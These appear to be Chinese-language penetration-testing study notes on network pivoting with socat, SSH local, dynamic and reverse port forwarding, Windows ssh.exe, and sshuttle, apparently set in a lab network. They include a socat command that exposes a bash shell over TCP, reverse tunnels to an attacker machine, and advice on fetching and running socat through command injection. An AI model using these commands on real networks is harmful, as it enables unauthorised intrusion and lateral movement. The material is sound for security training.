# socat端口转发
## 使用场景
目标主机含有两个网卡，即含有一个内网 ip段
没有防火墙或者防火墙开放所有 inbound
![[Pasted image 20240129095240.png]]
## 使用方法
使用 socat 测试网络联通
`socat - TCP-LISTEN:8080`  监听TCP8080
`socat - TCP:localhost:8080`   启动client链接TCP
使用 socat 信息传输
`socat - TCP-LISTEN:8080,fork,reuseaddr`    启动server
`socat - TCP:localhost:8080`     启动client
fork 参数可以应答对个socket连接，reuseaddr 防止链接没断开玩无法监听的问题
或者使用UDP
`socat - UDP-LISTEN:8080`
`socat - UDP:localhost:8080`
使用socat进行端口转发
**一般主机不会含有 socat 应用，这时需要使用[[命令注入漏洞|命令注入]] 漏洞来远程下载 socat 并且执行**
`socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`
 -ddd 为输出详细信息 在目标端口开放2345端口，将数据转发到内网10.4.50.215的5432端口
使用 socat 连接 shell
`socat TCP-LISTEN:8080,fork,reuseaddr EXEC:/usr/bin/bash,pty,stderr `  服务端
`socat file:tty,raw,echo=0 TCP:localhost:8080`     客户端



# SSH 端口转发
## 使用场景
ssh 端口转发可以在含有防火墙的网络中使用
一般在内网主机不能访问外网或者只有固定端口可以出网的网络中无法使用 ssh 端口转发，这时使用[[隧道工具|隧道技术]]
ssh 应用在各种服务器中都有含有，利用价值高
## 使用方法
本地端口转发 local port forwording
![[Pasted image 20240129154102.png]]
类似与 socat 工具，在没有[[Linux 防火墙#iptables防火墙|防火墙拦截]]或者防火墙开放所有端口时，可以使用
SSH 本地端口转发不同与 socat，数据包侦听与接受不是同一个主机，而是分成两个主机，在两个主机 (一个 SSH 客户机和一个 SSH 服务器)之间建立 SSH 连接，SSH 客户机打开一个监听端口，在该端口上接收的所有数据包都通过 SSH 连接隧道传送到 SSH 服务器
确定建立 ssh 端口转发时，已知两个主机的 ssh 密码
`ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`
` 0.0.0.0:4455为CONFLUENCE01`
` 172.16.50.217为????`
` 10.4.50.215为PGDATABASE01`
-N 参数表示不使用 shell，-L 代表本地端口转发，第一个是本地地址和开放端口，第二个是远程地址和开放端口，两个主机间建立 ssh 隧道
`ss -ntplu`查看监听的端口
**动态端口转发**：
![[Pasted image 20240129165413.png]]
动态端口转发是本地端口转发的升级版，不需要指定远程连接端口，主要用于进入内网后对内网进行扫描
防火墙关闭或者开放所有端口
`ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215`
` 0.0.0.0:9999为CONFLUENCE01`
` 10.4.50.215为PGDATABASE01`
-D 代表动态端口转发，在 CONFLUENCE01执行上述命令
**反向端口转发**：
![[Pasted image 20240129171532.png]]
一般常见网络中会含有防火墙，对于入站流量会严格管制，无法使用常见端口转发
防火墙对于入站流量管制，对于出战流量没有限制，可以使用反向端口转发
`ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`
` 127.0.0.1 192.168.118.4为kali`
` 10.4.50.215为PGDATABASE01`
-R 代表反向端口转发，在 CONFLUENCE 01 主机执行上述命令，在 kali 上会开放 127.0.0.1:2345 建立隧道
**反向动态端口转发**：
![[Pasted image 20240129174956.png]]
使用反向动态端口转发对内网进行枚举
`ssh -N -R 9988 kali@192.168.118.4`
在 CONFLUENCE 01 中执行上述命令


## SSH. EXE windows 工具
ssh 已经默认安装在 windows 中，一般安装在%system driver%:\\windows system 32\\OpenSSH
一般 windows 会设有防火墙，对与入站流量会拦截，所以使用反向端口转发
![[Pasted image 20240129205306.png]]
`where ssh`   搜索ssh的位置
`ssh.exe -v ` 查看ssh版本
`ssh -N -R 9090 kali@192.168.118.4`
-R 使用动态反向端口转发


# sshuttle 端口转发
一般内网要比想象中哟啊复杂，这是可以使用 sshuttle 工具
sshuttle 需要客户端 ssh 的 root 权限和服务端 python 3 权限
Kali -->(192.168.500/24)-->CONFLUENCE 01-->(10.4.50.0/24)-->PGDATABASE 01-->(172.16.50.0/24)-->HR 
`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
首先使用 socat 转发内网中含有 ssh 的主机
`sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`
使用 sshuttle 连接两个内网网段，--dns 表示转发本地 dns 请求



# Plink 端口转发

